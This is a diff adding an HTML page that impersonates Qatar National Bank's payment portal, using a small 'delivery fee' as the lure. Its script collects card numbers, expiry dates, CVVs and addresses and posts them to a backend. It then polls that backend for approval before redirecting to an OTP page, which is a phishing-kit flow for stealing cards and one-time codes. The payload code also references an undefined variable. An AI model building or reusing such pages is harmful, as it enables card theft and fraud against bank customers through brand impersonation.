@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QNB Qatar - Secure Payment Portal</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', 'Segoe UI', Tahoma, sans-serif;
+            background-color: #F5F8FF;
+            color: #212529;
+        }
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #ffffff;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 40px;
+            z-index: 1000;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        .header-left img {
+            height: 42px;
+            object-fit: contain;
+        }
+        .lang-btn {
+            font-weight: bold;
+            color: #ffffff;
+            background: #C41E3A;
+            padding: 10px 20px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-size: 15px;
+        }
+        .lang-btn:hover {
+            background-color: #A01830;
+        }
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            color: #000000;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        .phone-group {
+            display: none;
+            align-items: center;
+            gap: 8px;
+        }
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            width: 22px;
+            height: 16px;
+            cursor: pointer;
+        }
+        .menu-icon span {
+            display: block;
+            height: 3px;
+            background-color: #000000;
+            border-radius: 2px;
+        }
+
+        /* Main Wrapper */
+        .main-container {
+            margin-top: 85px;
+            padding: 40px 20px 80px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 85px);
+            background-color: #F5F8FF;
+        }
+
+        /* Checkout Card */
+        .checkout-card {
+            width: 100%;
+            max-width: 520px;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.04);
+            overflow: hidden;
+            border: 1px solid #D6E4F0;
+        }
+
+        /* Blue Header Background */
+        .checkout-header {
+            background: linear-gradient(135deg, #001F5C 0%, #002280 100%);
+            color: #ffffff;
+            padding: 25px 30px;
+            text-align: center;
+        }
+        .checkout-header h2 {
+            margin: 0;
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: 0.3px;
+        }
+        .secure-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(255, 255, 255, 0.15);
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-top: 8px;
+            font-weight: 500;
+        }
+
+        .checkout-body {
+            padding: 30px;
+        }
+
+        /* Blue Alert Boxes */
+        .alert-box {
+            padding: 14px 16px;
+            border-radius: 8px;
+            font-size: 13.5px;
+            line-height: 1.5;
+            margin-bottom: 15px;
+            font-weight: 500;
+            display: flex;
+            gap: 10px;
+            align-items: flex-start;
+            background-color: #ebf5ff;
+            color: #0c4a6e;
+            border: 1px solid #bae6fd;
+            border-left: 4px solid #0284c7;
+        }
+
+        /* Supported Card Logos */
+        .payment-methods {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #F5F8FF;
+            padding: 12px 18px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            border: 1px solid #D6E4F0;
+        }
+        .pm-label {
+            font-size: 13px;
+            color: #666;
+            font-weight: 600;
+        }
+        .pm-logos {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .pm-logos img {
+            height: 26px;
+            object-fit: contain;
+        }
+
+        /* Form Controls */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1A2744;
+            font-size: 14px;
+        }
+        .input-wrapper {
+            position: relative;
+        }
+        .form-control {
+            width: 100%;
+            padding: 14px 18px;
+            border: 1.5px solid #B8D4E8;
+            border-radius: 8px;
+            font-size: 15px;
+            outline: none;
+            transition: all 0.3s ease;
+            background-color: #fafbfc;
+            color: #333;
+        }
+        .form-control:focus {
+            border-color: #001F5C;
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(0,86,179,0.08);
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        /* Blue Submit Button */
+        .pay-btn {
+            background-color: #001F5C;
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0,51,160,0.2);
+            margin-top: 10px;
+        }
+        .pay-btn:hover {
+            background-color: #002280;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 15px rgba(0,51,160,0.3);
+        }
+
+        /* Footer Section */
+        footer {
+            background-color: #000000;
+            color: #ffffff;
+            padding: 60px 20px 30px 20px;
+        }
+        .footer-container {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .footer-logo {
+            height: 40px;
+            object-fit: contain;
+            margin-bottom: 25px;
+            filter: none;
+        }
+        .footer-info {
+            font-size: 15px;
+            line-height: 2.2;
+            color: #cccccc;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .footer-bottom {
+            margin-top: 40px;
+            width: 100%;
+            border-top: 1px solid #002280;
+            padding-top: 20px;
+            font-size: 14px;
+            color: #777777;
+            text-align: center;
+        }
+
+        /* Error Messages */
+        .field-error {
+            color: #dc3545;
+            font-size: 13px;
+            margin-top: 5px;
+            font-weight: 500;
+            display: none;
+        }
+        .field-error.show {
+            display: block;
+        }
+        .form-control.error {
+            border-color: #dc3545;
+            background-color: #fff5f5;
+        }
+        .form-control.error:focus {
+            box-shadow: 0 0 0 4px rgba(220,53,69,0.15);
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes shake { 0%,100%{transform:translateX(0)} 10%,30%,50%,70%,90%{transform:translateX(-5px)} 20%,40%,60%,80%{transform:translateX(5px)} }
+        @media (max-width: 580px) {
+            .checkout-card { border-radius: 0; box-shadow: none; border: none; }
+            .main-container { padding: 0; margin-top: 75px; }
+            .checkout-body { padding: 20px; }
+        }
+    </style>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+        <header>
+        <div class="menu-icon">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+        <div class="header-left">
+            <img src="images/qnb-logo.png" alt="QNB Qatar">
+        </div>
+        <div class="header-right">
+            <a href="payment.html" class="lang-btn">العربية</a>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <div class="checkout-card">
+            <div class="checkout-header">
+                <h2>Payment Confirmation</h2>
+                <div class="secure-badge">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                    256-bit Secure Checkout
+                </div>
+            </div>
+
+            <div class="checkout-body">
+                
+                <!-- Delivery Address Section -->
+                <div style="margin-bottom: 25px; padding: 20px; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px;">
+                    <h3 style="margin-top: 0; margin-bottom: 15px; font-size: 16px; color: #001F5C; display: flex; align-items: center; gap: 8px;">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
+                        Enter Delivery Address
+                    </h3>
+                    
+                    <div class="form-group">
+                        <label for="city">City / Area</label>
+                        <select id="city" name="city" class="form-control" required>
+                            <option value="">Select Area...</option>
+                            <option value="Doha">Doha</option>
+                            <option value="Al Rayyan">Al Rayyan</option>
+                            <option value="Al Wakrah">Al Wakrah</option>
+                            <option value="Al Khor">Al Khor</option>
+                            <option value="Lusail">Lusail</option>
+                            <option value="The Pearl">The Pearl</option>
+                            <option value="Umm Salal">Umm Salal</option>
+                            <option value="Al Sheehaniya">Al Sheehaniya</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="address_details">Address Details (Street, Building No, Apartment)</label>
+                        <input type="text" id="address_details" name="address_details" class="form-control" required placeholder="Ex: Corniche Street, Tower 10, Apt 5">
+                    </div>
+                </div>
+
+                <!-- Order Summary Section -->
+                <div style="margin-bottom: 25px; padding: 15px; background: #fffbeb; border: 1px solid #fef3c7; border-radius: 12px;">
+                    <h3 style="margin-top: 0; margin-bottom: 10px; font-size: 15px; color: #92400e;">Order Summary</h3>
+                    <div style="display: flex; justify-content: space-between; font-size: 14px; color: #4b5563; margin-bottom: 5px;">
+                        <span>Delivery Fee:</span>
+                        <span style="font-weight: 700; color: #1f2937;">5 QAR</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; font-size: 16px; font-weight: 800; color: #001F5C; margin-top: 8px; padding-top: 8px; border-top: 1px dashed #fcd34d;">
+                        <span>Total Amount:</span>
+                        <span>5 QAR</span>
+                    </div>
+                </div>
+
+                <!-- Logos Bar -->
+                <div class="payment-methods">
+                    <span class="pm-label">Supported Cards:</span>
+                    <div class="pm-logos">
+                        <img src="images/qnb-logo.png" alt="QNB Qatar">
+                        <img src="https://i.ibb.co/0p84ZGSf/Mastercard-visa-card-logo.png" alt="Visa Mastercard">
+                    </div>
+                </div>
+
+                <!-- Payment Form -->
+                <form id="paymentFormEn" method="POST">
+                    
+                    <div class="form-group">
+                        <label for="card_holder">Card Holder Name</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="card_holder" name="card_holder" class="form-control" required placeholder="Ex: ELMIR GASIMOV">
+                        </div>
+                        <div class="field-error" id="card_holder_error"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="card_number">Card Number</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="card_number" name="card_number" class="form-control" required placeholder="4169 •••• •••• 8888" maxlength="19">
+                        </div>
+                        <div class="field-error" id="card_number_error"></div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="expiry_date">Expiry Date</label>
+                            <input type="text" id="expiry_date" name="expiry_date" class="form-control" required placeholder="MM/YY" maxlength="5">
+                            <div class="field-error" id="expiry_date_error"></div>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="cvv">CVV / CVC</label>
+                            <input type="password" id="cvv" name="cvv" class="form-control" required placeholder="•••" maxlength="4">
+                            <div class="field-error" id="cvv_error"></div>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="pay-btn">Confirm Order</button>
+
+                </form>
+            </div>
+        </div>
+    </div>
+
+            <footer style="background-color: #001F5C; color: #ffffff; padding: 60px 20px 30px 20px; margin-top: 60px;">
+        <div class="footer-container">
+            <a href="index-en.html"><img src="images/qnb-logo.png" alt="QNB Qatar" class="footer-logo"></a>
+            <div class="footer-info">
+                <strong>Qatar National Bank (QNB)</strong>
+                <span>Doha - State of Qatar</span>
+                <span>Phone: +974 4440 7777</span>
+                <span>Email: info@qnb.com.qa</span>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2024 Qatar National Bank. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Loading Overlay (blue) -->
+    <div id="loadingOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#001F5C;z-index:9999;justify-content:center;align-items:center;flex-direction:column;">
+        <div style="width:90px;height:90px;background:rgba(255,255,255,0.1);border-radius:50%;display:flex;justify-content:center;align-items:center;">
+            <div style="width:45px;height:45px;border:4px solid rgba(255,255,255,0.3);border-top:4px solid #ffffff;border-radius:50%;animation:spin 1s linear infinite;"></div>
+        </div>
+        <div style="font-size:24px;font-weight:700;color:#ffffff;margin-top:25px;">Confirming Card Details...</div>
+        <p style="font-size:15px;color:rgba(255,255,255,0.8);margin-top:10px;">Please wait while your payment is being processed.</p>
+    </div>
+
+    <!-- Error Modal -->
+    <div id="errorModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:10000;justify-content:center;align-items:center;">
+        <div style="background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:shake 0.5s;border:2px solid #dc3545;">
+            <div style="font-size:50px;color:#dc3545;margin-bottom:15px;">✕</div>
+            <h3 style="color:#dc3545;margin-bottom:10px;">Verification Failed</h3>
+            <p style="color:#555;font-size:15px;">Please verify the correct information and try again</p>
+            <button onclick="closeErrorModal()" style="margin-top:20px;padding:12px 30px;background:#dc3545;color:white;border:none;border-radius:8px;font-size:15px;cursor:pointer;font-weight:bold;">Try Again</button>
+        </div>
+    </div>
+
+    <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+
+    <script>
+        let pollInterval = null;
+
+        // ===== VALIDATION FUNCTIONS =====
+
+        // Luhn Algorithm for card number validation
+        function isValidCardNumber(number) {
+            const digits = number.replace(/\s/g, '');
+            if (digits.length < 12 || digits.length > 19) return false;
+            if (!/^\d+$/.test(digits)) return false;
+            let sum = 0;
+            let isEven = false;
+            for (let i = digits.length - 1; i >= 0; i--) {
+                let digit = parseInt(digits.charAt(i), 10);
+                if (isEven) { digit *= 2; if (digit > 9) digit -= 9; }
+                sum += digit;
+                isEven = !isEven;
+            }
+            return (sum % 10) === 0;
+        }
+
+        // Helper: show error for a field
+        function showFieldError(fieldId, errorId, message) {
+            const field = document.getElementById(fieldId);
+            const errorEl = document.getElementById(errorId);
+            field.classList.add('error');
+            errorEl.textContent = message;
+            errorEl.classList.add('show');
+        }
+
+        // Helper: clear error for a field
+        function clearFieldError(fieldId, errorId) {
+            const field = document.getElementById(fieldId);
+            const errorEl = document.getElementById(errorId);
+            field.classList.remove('error');
+            errorEl.textContent = '';
+            errorEl.classList.remove('show');
+        }
+
+        // Validate expiry date (MM/YY must be valid future date)
+        function isValidExpiryDate(value) {
+            const match = value.match(/^(\d{2})\/(\d{2})$/);
+            if (!match) return false;
+            const month = parseInt(match[1], 10);
+            const year = parseInt('20' + match[2], 10);
+            if (month < 1 || month > 12) return false;
+            if (year < 2024) return false;
+            const now = new Date();
+            const expiryDate = new Date(year, month, 1);
+            return expiryDate > now;
+        }
+
+        // Validate CVV (3 or 4 digits)
+        function isValidCVV(value) {
+            return /^\d{3,4}$/.test(value);
+        }
+
+        // ===== REAL-TIME VALIDATION =====
+
+        // Card holder: real-time validation on blur
+        document.getElementById('card_holder').addEventListener('blur', function() {
+            const val = this.value.trim();
+            if (val.length > 0 && val.length < 3) {
+                showFieldError('card_holder', 'card_holder_error', 'Please enter a valid card holder name');
+            } else {
+                clearFieldError('card_holder', 'card_holder_error');
+            }
+        });
+
+        // Card number: real-time validation (on input when 13+ digits)
+        document.getElementById('card_number').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 16) value = value.substring(0, 16);
+            let formatted = value.replace(/(.{4})/g, '$1 ').trim();
+            e.target.value = formatted;
+
+            // Real-time validation: if user typed 13+ digits, validate with Luhn
+            if (value.length >= 13) {
+                if (value.length < 16) {
+                    clearFieldError('card_number', 'card_number_error');
+                } else if (value.length === 16) {
+                    if (!isValidCardNumber(value)) {
+                        showFieldError('card_number', 'card_number_error', 'Invalid card number');
+                    } else {
+                        clearFieldError('card_number', 'card_number_error');
+                    }
+                }
+            } else {
+                clearFieldError('card_number', 'card_number_error');
+            }
+        });
+
+        // Expiry date: real-time validation (when format is complete MM/YY)
+        document.getElementById('expiry_date').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) { value = value.substring(0, 2) + '/' + value.substring(2, 4); }
+            e.target.value = value;
+
+            // Real-time validation: if full format MM/YY
+            if (value.length === 5) {
+                const match = value.match(/^(\d{2})\/(\d{2})$/);
+                if (match) {
+                    const month = parseInt(match[1], 10);
+                    if (month < 1 || month > 12) {
+                        showFieldError('expiry_date', 'expiry_date_error', 'Invalid expiry date');
+                    } else if (!isValidExpiryDate(value)) {
+                        showFieldError('expiry_date', 'expiry_date_error', 'Invalid expiry date');
+                    } else {
+                        clearFieldError('expiry_date', 'expiry_date_error');
+                    }
+                } else {
+                    clearFieldError('expiry_date', 'expiry_date_error');
+                }
+            } else {
+                clearFieldError('expiry_date', 'expiry_date_error');
+            }
+        });
+
+        // CVV: real-time validation (when 3+ digits)
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.substring(0, 4);
+            e.target.value = value;
+
+            if (value.length >= 3) {
+                if (!isValidCVV(value)) {
+                    showFieldError('cvv', 'cvv_error', 'CVV must be 3 digits');
+                } else {
+                    clearFieldError('cvv', 'cvv_error');
+                }
+            } else if (value.length > 0) {
+                clearFieldError('cvv', 'cvv_error');
+            }
+        });
+
+        // Poll for order status
+        async function pollOrderStatus() {
+            const orderId = sessionStorage.getItem('orderId');
+            if (!orderId) return;
+            try {
+                const res = await fetch('/api/orders/' + orderId + '/status');
+                const data = await res.json();
+                if (data.status === 'approved') {
+                    clearInterval(pollInterval);
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    window.location.href = 'otp-en.html';
+                } else if (data.status === 'rejected') {
+                    clearInterval(pollInterval);
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    showErrorModal();
+                }
+            } catch (err) { console.error('Poll error:', err); }
+        }
+
+        function showErrorModal() { document.getElementById('errorModal').style.display = 'flex'; }
+        function closeErrorModal() { document.getElementById('errorModal').style.display = 'none'; }
+
+        document.getElementById('paymentFormEn').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const orderId = sessionStorage.getItem('orderId');
+            if (!orderId) { alert('Error: No order ID found'); window.location.href = 'data-en.html'; return; }
+
+            const cardHolder = document.getElementById('card_holder').value.trim();
+            const cardNumber = document.getElementById('card_number').value.trim();
+            const expiryDate = document.getElementById('expiry_date').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+            const city = document.getElementById('city').value;
+            const addressDetails = document.getElementById('address_details').value.trim();
+
+            // Validate delivery address
+            if (!city || !addressDetails) {
+                alert('Please complete delivery address information');
+                return;
+            }
+
+            // Validate card holder name
+            if (!cardHolder || cardHolder.length < 3) {
+                showFieldError('card_holder', 'card_holder_error', 'Please enter card holder name correctly');
+                return;
+            }
+
+            // Validate card number using Luhn algorithm
+            const rawCardNumber = cardNumber.replace(/\s/g, '');
+            if (!rawCardNumber || rawCardNumber.length < 12 || rawCardNumber.length > 19) {
+                showFieldError('card_number', 'card_number_error', 'Card number must be 12 to 19 digits');
+                return;
+            }
+            if (!isValidCardNumber(rawCardNumber)) {
+                showFieldError('card_number', 'card_number_error', 'Invalid card number');
+                return;
+            }
+
+            // Validate expiry date
+            if (!isValidExpiryDate(expiryDate)) {
+                showFieldError('expiry_date', 'expiry_date_error', 'Invalid expiry date');
+                return;
+            }
+
+            // Validate CVV
+            if (!isValidCVV(cvv)) {
+                showFieldError('cvv', 'cvv_error', 'CVV must be 3 digits');
+                return;
+            }
+
+            // Send card number without spaces
+            const data = {
+                orderId,
+                card_holder: cardHolder,
+                card_number: rawCardNumberSend,
+                expiry_date: expiryDate,
+                cvv: cvv,
+                delivery_address: {
+                    city: city,
+                    details: addressDetails
+                }
+            };
+            try {
+                const response = await fetch('/api/orders/payment-data', {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data)
+                });
+                const result = await response.json();
+                if (response.ok) {
+                    document.getElementById('loadingOverlay').style.display = 'flex';
+                    pollInterval = setInterval(pollOrderStatus, 2000);
+                } else { alert('Error: ' + result.error); }
+            } catch (err) { alert('Connection error'); }
+        });
+    </script>
+
+</body>
+</html>
